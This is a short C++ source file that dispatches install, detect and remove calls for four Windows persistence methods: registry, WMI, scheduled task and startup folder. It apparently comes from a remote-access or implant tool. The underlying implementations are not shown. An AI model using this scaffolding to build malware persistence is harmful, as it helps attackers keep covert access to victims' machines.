#include "persistence.hpp"

bool persist_install(PersistType type, const std::string& path)
{
    if (persist_detect(type))
        return (false);

    if (type == REGISTRY)
        return (registry_install(path));
    if (type == WMI)
        return (wmi_install(path));
    if (type == TASK)
        return (task_install(path));
    if (type == STARTUP)
        return (startup_install(path));
    return (false);
}

bool persist_detect(PersistType type)
{
    if (type == REGISTRY)
    {
        return (registry_detect());
    }
    if (type == WMI)
    {
        return (wmi_detect());
    }
    if (type == TASK)
    {
        return (task_detect());
    }
    if (type == STARTUP)
    {
        return (startup_detect());
    }
    return (false);
}

bool persist_remove(PersistType type)
{
    if (type == REGISTRY)
    {
        return (registry_remove());
    }
    if (type == WMI)
    {
        return (wmi_remove());
    }
    if (type == TASK)
    {
        return (task_remove());
    }
    if (type == STARTUP)
    {
        return (startup_remove());
    }
    return (false);
}